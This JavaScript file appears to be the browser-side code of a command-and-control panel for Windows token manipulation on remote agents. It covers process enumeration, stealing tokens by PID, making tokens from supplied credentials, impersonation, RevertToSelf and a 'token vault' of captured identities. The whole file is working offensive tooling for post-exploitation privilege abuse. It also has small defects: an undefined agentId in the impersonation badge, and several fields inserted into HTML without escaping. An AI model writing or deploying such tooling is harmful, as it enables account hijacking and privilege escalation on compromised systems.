function setOutput(text) {
  const el = document.getElementById('token-output');
  if (el) el.textContent = text;
}

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function tokenListProcs(id) {
  setOutput(__('Enumerating process tokens, waiting for agent...'));
  document.getElementById('proc-list-status').classList.remove('hidden');
  apiFetch('/agents/' + id + '/token/list_procs', {method: 'POST'})
    .then(d => {
      if (d.success) { showToast(__('Enumeration request sent'), 'success'); startPollingTaskResult(id, d.task_id); }
      else setOutput(__tf('Request failed: {0}', d.error || __('Unknown error')));
    }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function tokenSteal(id) {
  const pid = document.getElementById('steal-pid').value.trim();
  const procName = document.getElementById('steal-procname').value.trim();
  if (!pid) { showToast(__('Please enter target PID'), 'error'); return; }
  setOutput(__tf('Sending steal_token pid={0}...', pid));
  apiFetch('/agents/' + id + '/token/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'pid=' + encodeURIComponent(pid) + '&process_name=' + encodeURIComponent(procName)
  }).then(d => {
    if (d.success) { showToast(__('Steal token sent'), 'success'); startPollingTaskResult(id, d.task_id); }
    else setOutput(__tf('Request failed: {0}', d.error || ''));
  }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function tokenMake(id) {
  const user = document.getElementById('make-user').value.trim();
  const password = document.getElementById('make-password').value;
  const logonType = document.getElementById('make-logon-type').value;
  if (!user) { showToast(__('Please enter username'), 'error'); return; }
  setOutput(__tf('Creating token {0} ({1})...', user, logonType));
  apiFetch('/agents/' + id + '/token/make', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'user=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(password) + '&logon_type=' + encodeURIComponent(logonType)
  }).then(d => {
    if (d.success) { showToast(__('Make token sent'), 'success'); startPollingTaskResult(id, d.task_id); }
    else setOutput(__tf('Request failed: {0}', d.error || ''));
  }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function tokenRevert(id) {
  setOutput(__('Sending RevertToSelf...'));
  apiFetch('/agents/' + id + '/token/revert', {method: 'POST'})
    .then(d => {
      if (d.success) { showToast(__('Rev2Self sent'), 'success'); startPollingTaskResult(id, d.task_id); }
      else setOutput(__tf('Request failed: {0}', d.error || ''));
    }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function tokenWhoami(id) {
  setOutput(__('Querying current token identity...'));
  apiFetch('/agents/' + id + '/token/whoami', {method: 'POST'})
    .then(d => {
      if (d.success) { showToast(__('Whoami sent'), 'success'); startPollingTaskResult(id, d.task_id); }
      else setOutput(__tf('Request failed: {0}', d.error || ''));
    }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function tokenReImpersonate(id, tokenId) {
  if (!confirm(__('Re-impersonate this token?'))) return;
  apiFetch('/agents/' + id + '/token/' + tokenId + '/impersonate', {method: 'POST'})
    .then(d => {
      if (d.success) { showToast(__('Re-impersonate sent'), 'success'); startPollingTaskResult(id, d.task_id); }
      else setOutput(__tf('Request failed: {0}', d.error || ''));
    }).catch(e => setOutput(__tf('Request failed: {0}', e.message)));
}

function dropToken(id, tokenId, btn) {
  if (!confirm(__('Delete this token record?'))) return;
  apiFetch('/agents/' + id + '/token/' + tokenId, {method: 'DELETE'})
    .then(d => {
      if (d.success) { btn.closest('.token-entry').remove(); showToast(__('Token deleted'), 'success'); }
      else showToast(__tf('Delete failed: {0}', d.error || ''), 'error');
    }).catch(e => showToast(__tf('Delete failed: {0}', e.message), 'error'));
}

function editTokenNote(id, tokenId, currentNote) {
  const note = prompt(__('Edit note:'), currentNote || '');
  if (note === null) return;
  apiFetch('/agents/' + id + '/token/' + tokenId + '/note', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'notes=' + encodeURIComponent(note)
  }).then(() => { showToast(__('Note updated'), 'success'); location.reload(); })
    .catch(e => showToast(__tf('Failed: {0}', e.message), 'error'));
}

function refreshTokenVault(id) {
  apiFetch('/agents/' + id + '/token/list')
    .then(tokens => renderTokenVault(id, tokens))
    .catch(() => {});
}

function renderTokenVault(id, tokens) {
  const vault = document.getElementById('token-vault');
  if (!vault) return;
  if (!tokens || tokens.length === 0) {
    vault.innerHTML = '<div class="text-center py-10 text-slate-400 text-sm border-2 border-dashed border-slate-200 rounded-2xl"><i class="fa-solid fa-vault text-3xl mb-3 text-slate-300"></i><br>' + __('No tokens') + '</div>';
    return;
  }
  const integrityClass = (i) => {
    if (i === 'System') return 'bg-red-100 text-red-700';
    if (i === 'High') return 'bg-orange-100 text-orange-700';
    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
    return 'bg-slate-100 text-slate-600';
  };
  vault.innerHTML = tokens.map(t => '<div class="token-entry flex items-center gap-3 p-3 rounded-2xl border ' + (t.active ? 'border-amber-300 bg-amber-50' : 'border-slate-100 bg-slate-50') + ' transition-colors" data-token-id="' + t.id + '">' +
    '<div class="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 ' + (t.source === 'steal' ? 'bg-amber-500' : 'bg-emerald-500') + '"><i class="fa-solid ' + (t.source === 'steal' ? 'fa-hand-holding' : 'fa-magic') + ' text-white text-sm"></i></div>' +
    '<div class="flex-1 min-w-0"><div class="flex items-center gap-2"><span class="font-semibold text-sm text-slate-900 truncate">' + escHtml(t.domain) + '\\' + escHtml(t.username) + '</span>' +
    (t.active ? '<span class="text-[10px] px-1.5 py-0.5 bg-amber-200 text-amber-800 rounded font-medium">' + __('Active') + '</span>' : '') + '</div>' +
    '<div class="flex items-center gap-3 text-xs text-slate-400 mt-0.5">' +
    (t.pid ? '<span><i class="fa-solid fa-microchip mr-1"></i>PID: ' + t.pid + '</span>' : '') +
    (t.process_name ? '<span class="font-mono">' + escHtml(t.process_name) + '</span>' : '') +
    '<span class="px-1.5 py-px rounded text-[10px] font-medium ' + integrityClass(t.integrity) + '">' + (t.integrity || '-') + '</span>' +
    '<span class="text-[10px] text-slate-300">' + t.source + '</span></div>' +
    (t.notes ? '<div class="text-xs text-slate-400 italic mt-0.5 truncate">' + escHtml(t.notes) + '</div>' : '') + '</div>' +
    '<div class="flex items-center gap-1 flex-shrink-0">' +
    (!t.active ? '<button onclick="tokenReImpersonate(\'' + id + '\',' + t.id + ')" title="' + __('Re-impersonate') + '" class="p-1.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded-lg transition-colors"><i class="fa-solid fa-play text-xs"></i></button>' : '') +
    '<button onclick="editTokenNote(\'' + id + '\',' + t.id + ',\'' + (t.notes||'').replace(/'/g,"\\'") + '\')" class="p-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 rounded-lg transition-colors"><i class="fa-solid fa-pencil text-xs"></i></button>' +
    '<button onclick="dropToken(\'' + id + '\',' + t.id + ',this)" class="p-1.5 bg-red-50 hover:bg-red-100 text-red-600 rounded-lg transition-colors"><i class="fa-solid fa-trash text-xs"></i></button></div></div>').join('');
}

function renderProcTable(procs) {
  const tbody = document.getElementById('proc-tbody');
  if (!procs || procs.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" class="text-center py-6 text-slate-400">' + __('No data') + '</td></tr>';
    return;
  }
  const intClass = (i) => {
    if (i === 'System') return 'bg-red-100 text-red-700';
    if (i === 'High') return 'bg-orange-100 text-orange-700';
    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
    return 'bg-slate-100 text-slate-600';
  };
  tbody.innerHTML = procs.map(p => {
    const user = p.Error ? '<span class="text-slate-300 italic">' + p.Error + '</span>' : '<span class="text-slate-700">' + escHtml(p.Domain) + '\\' + escHtml(p.Username) + '</span>';
    const stealBtn = !p.Error ? '<button onclick="fillSteal(' + p.PID + ',\'' + (p.ProcessName||'').replace(/'/g,"\\'") + '\')" class="px-2 py-0.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded text-[10px] font-medium whitespace-nowrap">Steal</button>' : '';
    return '<tr class="hover:bg-slate-50 proc-row" data-name="' + (p.ProcessName||'').toLowerCase() + '" data-user="' + ((p.Domain||'')+'\\\\'+(p.Username||'')).toLowerCase() + '"><td class="py-1.5 px-2 font-mono text-indigo-600">' + p.PID + '</td><td class="py-1.5 px-2 font-mono text-xs truncate max-w-[8rem]">' + escHtml(p.ProcessName) + '</td><td class="py-1.5 px-2">' + user + '</td><td class="py-1.5 px-2"><span class="px-1.5 py-px rounded text-[10px] font-medium ' + intClass(p.Integrity) + '">' + (p.Integrity || '-') + '</span></td><td class="py-1.5 px-2">' + stealBtn + '</td></tr>';
  }).join('');
}

function fillSteal(pid, procName) {
  document.getElementById('steal-pid').value = pid;
  document.getElementById('steal-procname').value = procName;
  document.getElementById('steal-pid').scrollIntoView({behavior:'smooth', block:'center'});
}

function quickFillProcName(name) {
  document.getElementById('steal-procname').value = name;
}

function filterProcTable(query) {
  const q = query.toLowerCase();
  document.querySelectorAll('#proc-tbody .proc-row').forEach(row => {
    const match = !q || row.dataset.name.includes(q) || row.dataset.user.includes(q);
    row.style.display = match ? '' : 'none';
  });
}

function startPollingTaskResult(agentId, taskId) {
  let tries = 0;
  const maxTries = 40;
  const interval = setInterval(() => {
    tries++;
    apiFetch('/tasks/' + taskId)
      .then(data => {
        if (data.status === 'completed') { clearInterval(interval); handleTaskCompleted(agentId, data); }
        else if (data.status === 'failed') { clearInterval(interval); setOutput(__tf('[Failed] {0}', data.error || __('Unknown error'))); showToast(__tf('Task failed: {0}', data.error || ''), 'error'); }
        else if (tries >= maxTries) { clearInterval(interval); setOutput(__('[Timeout] Agent did not respond within 60s, check connection')); }
      }).catch(e => { if (tries >= maxTries) { clearInterval(interval); setOutput(__tf('[Timeout] {0}', e.message)); } });
  }, 1500);
}

function handleTaskCompleted(agentId, data) {
  const type = data.type;
  if (type === 'token_list_procs') {
    try {
      let raw = data.result;
      let procs;
      try { procs = JSON.parse(atob(raw)); } catch(e) { procs = JSON.parse(raw); }
      renderProcTable(procs);
      setOutput(__tf('Enumeration complete, {0} processes found', procs.length));
      document.getElementById('proc-list-status').classList.add('hidden');
    } catch(e) { setOutput(__('Process list: ') + data.result); }
  } else if (type === 'token_steal' || type === 'token_make') {
    try {
      const m = JSON.parse(data.result);
      const label = type === 'token_steal' ? __('Token stolen') : __('Token created');
      setOutput('\u2713 ' + label + '\n  ' + __('User') + ': ' + m.domain + '\\' + m.username + '\n  ' + __('Integrity') + ': ' + m.integrity + '\n  ' + __('Current identity') + ': ' + m.whoami);
      showToast(label + ': ' + m.domain + '\\' + m.username, 'success');
      setTimeout(() => refreshTokenVault(agentId), 800);
      updateImpersonationBadge(m.domain, m.username, m.integrity);
    } catch(e) { setOutput(data.result); }
  } else if (type === 'token_revert' || type === 'rev2self') {
    try {
      const m = JSON.parse(data.result);
      setOutput('\u2713 RevertToSelf ' + __('success') + '\n  ' + __('Restored identity') + ': ' + m.whoami);
      showToast(__('Reverted to original token'), 'success');
      clearImpersonationBadge();
      setTimeout(() => refreshTokenVault(agentId), 800);
    } catch(e) { setOutput(data.result); }
  } else if (type === 'token_whoami') {
    try { const m = JSON.parse(data.result); setOutput(__('Current identity') + ': ' + m.whoami); } catch(e) { setOutput(data.result); }
  } else {
    setOutput(data.result || data.error || __('(empty)'));
  }
}

function updateImpersonationBadge(domain, username, integrity) {
  const badge = document.getElementById('impersonation-badge');
  badge.innerHTML = '<div class="flex items-center gap-2 bg-amber-100 border border-amber-300 rounded-2xl px-4 py-2">' +
    '<span class="w-2.5 h-2.5 bg-amber-500 rounded-full animate-pulse"></span>' +
    '<span class="text-sm font-semibold text-amber-700"><i class="fa-solid fa-user-secret mr-1"></i>' + __('Impersonating') + ': ' + escHtml(domain) + '\\' + escHtml(username) + '</span>' +
    '<span class="text-xs text-amber-600 ml-1">(' + integrity + ')</span>' +
    '<button onclick="tokenRevert(\'' + agentId + '\')" class="ml-2 px-2.5 py-1 bg-amber-500 hover:bg-amber-600 text-white text-xs rounded-xl transition-colors"><i class="fa-solid fa-sign-out-alt mr-1"></i>Rev2Self</button></div>';
}

function clearImpersonationBadge() {
  const badge = document.getElementById('impersonation-badge');
  badge.innerHTML = '<div class="flex items-center gap-2 bg-slate-100 border border-slate-200 rounded-2xl px-4 py-2">' +
    '<span class="w-2.5 h-2.5 bg-slate-400 rounded-full"></span>' +
    '<span class="text-sm text-slate-500">' + __('Not impersonating (original token)') + '</span></div>';
}
